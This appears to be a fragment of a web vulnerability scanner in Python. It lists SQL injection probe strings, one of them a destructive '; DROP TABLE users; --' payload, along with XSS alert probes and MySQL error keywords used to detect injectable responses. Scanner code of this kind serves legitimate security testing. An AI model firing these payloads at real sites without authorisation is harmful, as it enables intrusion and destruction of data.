SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "admin'--", "' UNION SELECT NULL,NULL--",
    "'; DROP TABLE users; --"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "'><svg/onload=alert(2)>"
]

ERROR_KEYWORDS = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "sql syntax", "mysql_fetch",
    "num_rows", "mysql_error", "invalid query"
]